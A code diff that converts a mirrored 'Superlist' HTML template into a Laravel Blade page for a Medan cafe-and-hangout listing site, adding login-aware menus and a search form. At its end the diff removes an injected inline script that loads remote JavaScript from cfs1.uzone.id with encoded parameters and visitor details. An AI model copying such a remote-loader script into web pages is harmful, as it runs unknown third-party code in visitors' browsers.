@@ -1,36 +1,7 @@
-<!DOCTYPE html>
-<html>
+@extends('layouts.intro')
 
-
-<!-- Mirrored from preview.byaviators.com/template/superlist/ by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 14 May 2017 15:03:57 GMT -->
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
-
-    <link href="http://fonts.googleapis.com/css?family=Nunito:300,400,700" rel="stylesheet" type="text/css">
-    <link href="{{ asset('') }}assets/libraries/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-    <link href="{{ asset('') }}assets/libraries/owl.carousel/assets/owl.carousel.css" rel="stylesheet" type="text/css" >
-    <link href="{{ asset('') }}assets/libraries/colorbox/example1/colorbox.css" rel="stylesheet" type="text/css" >
-    <link href="{{ asset('') }}assets/libraries/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" type="text/css">
-    <link href="{{ asset('') }}assets/libraries/bootstrap-fileinput/fileinput.min.css" rel="stylesheet" type="text/css">
-    <link href="{{ asset('') }}assets/css/superlist.css" rel="stylesheet" type="text/css" >
-
-    <link href="{{ asset('') }}css/login-register.css" rel="stylesheet" />
-    <link href="{{ asset('') }}css/bootstrap.css" rel="stylesheet" />
-
-    <script src="{{ asset('') }}assets/js/login-register.js" type="text/javascript"></script>
-    <script src="{{ asset('') }}assets/js/bootstrap.js" type="text/javascript"></script>
-
-    <link rel="shortcut icon" type="image/x-icon" href="{{ asset('') }}assets/favicon.png">
-
-    <title>Tempat Nongkrong Medan</title>
-</head>
-
-
-<body class="">
-
-<div class="page-wrapper">
+@section('content')
+    <div class="page-wrapper">
     
     <header class="header header-transparent">
     <div class="header-wrapper">
@@ -47,19 +18,57 @@
                     <div class="header-bottom">
                         <!-- /.header-action -->
 
-                        <ul class="header-nav-primary nav nav-pills collapse navbar-collapse">
+                        <ul class="header-nav-primary nav nav-pills collapse navbar-collapse" style="font-weight: 500;">
+
                             <li class="active" >
-                                <a href="#">Home </a>
+                                <a href="/">Home </a>
 
                             </li>
+                        @if(Auth::check())
+
+                            @permission(('user'))
+
+                           <li>
+                                <a href="#">
+                                @if(Auth::user()->avatar=="")
+                                <img src="{{Auth::user()->getAvatarUrl()}}" alt="" style="width:30px;height: 30px; border-radius: 30px; overflow: relative; margin-right: 7px; margin-top: -5px;">{{Auth::user()->name}} <i class="fa fa-chevron-down"></i></a>
+                                @else
+                                <img src="{{ asset('') }}assets/img/tmp/{{Auth::user()->avatar}}" alt="" style="width:30px;height: 30px; border-radius: 30px; overflow: relative; margin-right: 7px; margin-top: -5px;">{{Auth::user()->name}} <i class="fa fa-chevron-down"></i></a>
+                                @endif
+
+                                <ul class="sub-menu">
+                                    <li><a href="user/profile">Profile</a></li>
+                                    <li><a href="user/profile">Notifications</a></li>
+                                    <li><a href="user/profile">Bookmarks</a></li>
+                                    <li><a href="user/profile">Review</a></li>
+                                    <li><a href="user/profile">Setting</a></li>
+                                    <li>
+                                        <a href="{{route('logout')}}"
+                                        onclick="event.preventDefault();
+                                        document.getElementById('logout-form').submit();">
+                                        <i class="fa fa-sign-out pull-right"></i> @lang('general.logout.logout')
+                                    </a>
+
+                                    <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
+                                        {{ csrf_field() }}
+                                    </form>
+
+                                    </li>
+                                </ul>
+                            </li>
+                            @endpermission
+                            
+                        @else
                             <li class="active" >
-                                <a style="border: 1px solid white;padding: 10px 17px;margin-top: 10px;" data-toggle="modal" href="javascript:void(0)" onclick="openLoginModal();"">Login</a>
+                                <a style="border: 1px solid white;padding: 10px 17px;margin-top: 10px;" data-toggle="modal" href="javascript:void(0)" onclick="openLoginModal();">Login</a>
 
                             </li>
                             <li class="active">
                                 <a data-toggle="modal" href="javascript:void(0)" onclick="openRegisterModal();">Sign Up</a>
 
                             </li>
+                        @endif
+
                         </ul>
 
                         <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".header-nav-primary">
@@ -161,34 +170,47 @@
             <div class="container">
                 <div class="row">
                     <div class="col-sm-4 col-sm-offset-8 col-lg-4 col-lg-offset-7">
-                        <form method="get" action="http://preview.byaviators.com/template/superlist/?">
+                        <form method="post" action="/cari">
+                        {{ csrf_field() }}
                             <h2>Start Searching</h2>
 
                             <div class="hero-image-keyword form-group">
-                                <input type="text" class="form-control" placeholder="Keyword">
+                                <input type="text" class="form-control" placeholder="Keyword" name="kata">
                             </div><!-- /.form-group -->
 
                             <div class="hero-image-location form-group">
-                                <select class="form-control" title="Location">
-                                    <option>Bronx</option>
-                                    <option>Brooklyn</option>
-                                    <option>Manhattan</option>
-                                    <option>Staten Island</option>
-                                    <option>Queens</option>
+                                <select class="form-control" title="Location" name="location" id="location">
+                                    <option>Medan Kota</option>
+                                    <option>Medan Tuntungan</option>
+                                    <option>Medan Timur</option>
+                                    <option>Medan Tembung</option>
+                                    <option>Medan Sunggal</option>
+                                    <option>Medan Selayang</option>
+                                    <option>Medan Polonia</option>
+                                    <option>Medan Petisah</option>
+                                    <option>Medan Perjuangan</option>
+                                    <option>Medan Marelan</option>
+                                    <option>Medan Maimun</option>
+                                    <option>Medan Labuhan</option>
+                                    <option>Medan Petisah</option>
+                                    <option>Medan Perjuangan</option>
                                 </select>
                             </div><!-- /.form-group -->
 
                             <div class="hero-image-category form-group">
-                                <select class="form-control" title="Category">
-                                    <option value="">Automotive</option>
-                                    <option value="">Jobs</option>
-                                    <option value="">Nightlife</option>
-                                    <option value="">Services</option>
+                                <select class="form-control" title="Category" id="category" name="kategory">
+                                    <option value="">Coffe</option>
+                                    <option value="">Dessert And Bake</option>
+                                    <option value="">dinner</option>
+                                    <option value="">lunch</option>
+                                    <option value="">Drink</option>
                                 </select>
                             </div><!-- /.form-group -->
+            <input type="hidden" name="_method" value="POST">
+            <input type="hidden" name="_token" value="{{ Session::token() }}">
 
                             <div class="hero-image-price form-group">
-                                <input type="text" class="form-control" placeholder="Min. Price">
+                                <input type="text" class="form-control" placeholder="Min. Price" name="price">
                             </div><!-- /.form-group -->
 
                             <button type="submit" class="btn btn-primary btn-block">Search</button>
@@ -1178,53 +1200,4 @@
 </footer><!-- /.footer -->
 
 </div><!-- /.page-wrapper -->
-
-<script src="{{ asset('') }}assets/js/jquery.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/js/map.js" type="text/javascript"></script>
-
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/collapse.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/carousel.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/transition.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/dropdown.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/tooltip.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/tab.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/bootstrap-sass/javascripts/bootstrap/alert.js" type="text/javascript"></script>
-
-<script src="{{ asset('') }}assets/libraries/colorbox/jquery.colorbox-min.js" type="text/javascript"></script>
-
-<script src="{{ asset('') }}assets/libraries/flot/jquery.flot.min.js" type="text/javascript"></script>
-<script src="{{ asset('') }}assets/libraries/flot/jquery.flot.spline.js" type="text/javascript"></script>
-
-<script src="{{ asset('') }}assets/libraries/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
-
-<script src="http://maps.googleapis.com/maps/api/js?libraries=weather,geometry,visualization,places,drawing" type="text/javascript"></script>
-
-<script type="text/javascript" src="{{ asset('') }}assets/libraries/jquery-google-map/infobox.js"></script>
-<script type="text/javascript" src="{{ asset('') }}assets/libraries/jquery-google-map/markerclusterer.js"></script>
-<script type="text/javascript" src="{{ asset('') }}assets/libraries/jquery-google-map/jquery-google-map.js"></script>
-
-<script type="text/javascript" src="{{ asset('') }}assets/libraries/owl.carousel/owl.carousel.js"></script>
-<script type="text/javascript" src="{{ asset('') }}assets/libraries/bootstrap-fileinput/fileinput.min.js"></script>
-
-<script src="{{ asset('') }}assets/js/superlist.js" type="text/javascript"></script>
-
-
-<script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','../www.google-analytics.com/analytics.js','ga');
-
-  ga('create', 'UA-46172202-1', 'auto');
-  ga('send', 'pageview');
-
-</script>
-
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKS3CDCrE1R7PeCYK0JmpL2V%2fkQ%2faUJpnR8PGvznCPtV2kaOJDLe0LHZMBNqqw%2b6%2f3ACEyU06lZy1rWAqB%2bpL%2bXHfbvfXca%2fhnlrNayx6vvjNh3S3JI2d52sYAdgX0V6UM2FOE6Dvp8aRqT1bbZS%2bXUsQA%2bzcHwiEV00s1uximTHLx3kiM6iMKMaT7guxdV6n8GgDk1cLXW3JDZZXhOAfM%2fLFAj2HUTw%2f%2fAlmH4eg5ZcPjUv8yHxviyuheZFIw72rQHsM8IrRyMSf%2b9r4HCmfzoOp7hK7pETr0D%2fzyEVyTDU%2bVY%2fKbKogyfMME8vp0OoeyriYI%2fs8fDOUpG9qJKiRXKeOjSz5Bsx3qgfGmNedosu6eQRQEaPoI6Jubi6U0lGqZDAuum8LQFpArb1ehyPNkSYcZvgu70dItvqxAGiS0trbUeCmi2atIg3cZfRU7wlrZv8oMS8%2ffL034yjJoxnRTaovy54wPAaEP07u62nmYHSpdsqupX1s%2f%2bE3StwNkKvarDsSpRq5asoltQgpwpUjFk5TX0aHyJHvNdTdT%2bybHKwl76UCxVJX96waOyJtTFMIJv%2fv2hAqYA7cn8nvF6CP0xnwiMGykIH0YDG6CWxKdWwkssOgX8r9lwHwEuK8hIQ2N0SCO1oESPjzT3ZF3t17dgsH22h574SYWugertBZq2zE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-
-</body>
-
-
-<!-- Mirrored from preview.byaviators.com/template/superlist/ by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 14 May 2017 15:05:37 GMT -->
-</html>
+@endsection
